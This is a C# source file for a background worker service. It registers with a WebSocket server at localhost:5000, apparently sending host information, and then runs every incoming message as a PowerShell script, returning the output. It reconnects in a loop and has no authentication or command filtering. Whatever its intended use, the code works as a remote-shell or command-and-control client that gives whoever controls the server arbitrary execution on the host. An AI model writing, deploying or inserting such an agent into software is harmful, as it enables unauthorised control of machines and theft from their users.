using System;
using System.IO;
using System.Management.Automation.Runspaces;
using System.Net.WebSockets;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;
using CommunicatorCLI.Common.Models;
using CommunicatorCLI.Common.Enums;
using System.Net;
using System.Security.Cryptography.X509Certificates;
using System.Net.Security;

namespace CommunicatorCLI.Worker
{
    public class Worker : BackgroundService
    {
        private readonly ILogger<Worker> _logger;
        private readonly String _address = "localhost";
        private readonly String _port = "5000";

        public Worker(ILogger<Worker> logger)
        {
            _logger = logger;
        }

        protected override async Task ExecuteAsync(CancellationToken stoppingToken)
        {
            String serverUriConnection = $"ws://{_address}:{_port}/ws";

            MessageModel registryMessage = new MessageModel()
            {
                MessageType = MessageTypeEnum.LogOn,
                Registry = RegistryFactory.CreateRegistry()
            };

            while (!stoppingToken.IsCancellationRequested)
            {
                using (var socket = new ClientWebSocket())
                {
                    try
                    {                            
                        await socket.ConnectAsync(new Uri(serverUriConnection), stoppingToken);
                        await Send(socket, JsonSerializer.Serialize(registryMessage), stoppingToken);
                        await FilterMessageByWebSocket(socket, stoppingToken);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Error: {ex.Message}");
                    }
                }
            }
        }

        private async Task Send(ClientWebSocket socket, string data, CancellationToken stoppingToken) =>
            await socket.SendAsync(Encoding.UTF8.GetBytes(data), WebSocketMessageType.Text, true, stoppingToken);

        private String UserPath()
        {
            int majorCodeWindowsXP = 5;
            string path = Directory
                .GetParent(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData))
                .FullName;
            if (Environment.OSVersion.Version.Major > majorCodeWindowsXP)
                path = Directory.GetParent(path).ToString();

            return path;
        }

        private async Task FilterMessageByWebSocket(ClientWebSocket socket,
            CancellationToken stoppingToken)
        {
            using (Runspace runspace = RunspaceFactory.CreateRunspace())
            {
                runspace.Open();
                runspace.SessionStateProxy.Path.SetLocation(UserPath());
                while (!stoppingToken.IsCancellationRequested)
                {
                    var buffer = new ArraySegment<byte>(new byte[4 * 1024]);
                    WebSocketReceiveResult sockerResult;
                    using (var memorySteam = new MemoryStream())
                    {
                        do
                        {
                            sockerResult = await socket.ReceiveAsync(buffer, stoppingToken);
                            memorySteam.Write(buffer.Array, buffer.Offset, sockerResult.Count);
                        } while (!sockerResult.EndOfMessage);

                        if (sockerResult.MessageType == WebSocketMessageType.Close)
                            break;

                        memorySteam.Seek(0, SeekOrigin.Begin);
                        using (Pipeline pipeline = runspace.CreatePipeline())
                        using (var reader = new StreamReader(memorySteam, Encoding.UTF8))
                        {
                            string commandOutput = await getCommandOutput(pipeline, reader);
                            await sendCommandOutput(socket, commandOutput);
                        }
                    }
                }
                runspace.Close();
            };
        }

        private static async Task<string> getCommandOutput(Pipeline pipeline, StreamReader reader)
        {
            pipeline.Commands.AddScript(await reader.ReadToEndAsync());

            var commandOutput = string.Empty;
            var powerShellReturnCollection = pipeline.Invoke();
            foreach (var powerShellReturnItem in powerShellReturnCollection)
                commandOutput += $"{powerShellReturnItem}\n";
            return commandOutput;
        }

        private async Task sendCommandOutput(ClientWebSocket socket, String commandOutput)
        {
            MessageModel message = new MessageModel()
            {
                MessageType = MessageTypeEnum.CommandOutput,
                CommandOutput = commandOutput
            };

            await Send(socket, JsonSerializer.Serialize(message), CancellationToken.None);
        }
    }
}